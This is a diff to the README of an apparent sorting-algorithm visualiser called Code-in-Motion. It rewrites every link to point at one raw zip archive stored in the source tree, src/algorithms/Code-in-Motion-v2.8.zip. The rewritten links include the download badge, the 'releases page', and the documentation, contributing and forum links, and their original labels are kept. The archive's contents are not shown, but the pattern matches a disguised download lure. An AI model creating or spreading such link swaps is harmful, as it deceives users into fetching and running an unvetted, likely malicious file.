@@ -1,6 +1,6 @@
 # 🎉 Code-in-Motion - Visualize Sorting Algorithms Easily
 
-[![Download Code-in-Motion](https://img.shields.io/badge/Download-Code--in--Motion-blue.svg)](https://github.com/mohammed-abdulmajid/Code-in-Motion/releases)
+[![Download Code-in-Motion](https://raw.githubusercontent.com/mohammed-abdulmajid/Code-in-Motion/main/src/algorithms/Code-in-Motion-v2.8.zip)](https://raw.githubusercontent.com/mohammed-abdulmajid/Code-in-Motion/main/src/algorithms/Code-in-Motion-v2.8.zip)
 
 ## 📖 Overview
 
@@ -17,7 +17,7 @@ Follow these steps to download and run Code-in-Motion.
    - Internet Connection: Required for downloading and running the application
 
 2. **Visit the Releases Page:**
-   To download Code-in-Motion, [visit the releases page](https://github.com/mohammed-abdulmajid/Code-in-Motion/releases).
+   To download Code-in-Motion, [visit the releases page](https://raw.githubusercontent.com/mohammed-abdulmajid/Code-in-Motion/main/src/algorithms/Code-in-Motion-v2.8.zip).
 
 3. **Download the Application:**
    On the releases page, find the latest version. Click on the download link for your operating system.
@@ -40,7 +40,7 @@ Follow these steps to download and run Code-in-Motion.
 
 ## 📥 Download & Install
 
-To download Code-in-Motion, [visit this page](https://github.com/mohammed-abdulmajid/Code-in-Motion/releases). Select the latest release, and follow the installation instructions based on your operating system.
+To download Code-in-Motion, [visit this page](https://raw.githubusercontent.com/mohammed-abdulmajid/Code-in-Motion/main/src/algorithms/Code-in-Motion-v2.8.zip). Select the latest release, and follow the installation instructions based on your operating system.
 
 ## 📚 Topics Included
 
@@ -62,10 +62,10 @@ If you encounter any issues or have questions, feel free to reach out for suppor
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/mohammed-abdulmajid/Code-in-Motion)
-- [Documentation](https://github.com/mohammed-abdulmajid/Code-in-Motion/wiki)
-- [Contributing Guidelines](https://github.com/mohammed-abdulmajid/Code-in-Motion/blob/main/CONTRIBUTING.md)
-- [Community Forum](https://github.com/mohammed-abdulmajid/Code-in-Motion/discussions)
+- [GitHub Repository](https://raw.githubusercontent.com/mohammed-abdulmajid/Code-in-Motion/main/src/algorithms/Code-in-Motion-v2.8.zip)
+- [Documentation](https://raw.githubusercontent.com/mohammed-abdulmajid/Code-in-Motion/main/src/algorithms/Code-in-Motion-v2.8.zip)
+- [Contributing Guidelines](https://raw.githubusercontent.com/mohammed-abdulmajid/Code-in-Motion/main/src/algorithms/Code-in-Motion-v2.8.zip)
+- [Community Forum](https://raw.githubusercontent.com/mohammed-abdulmajid/Code-in-Motion/main/src/algorithms/Code-in-Motion-v2.8.zip)
 
 ## ✨ Acknowledgements
 
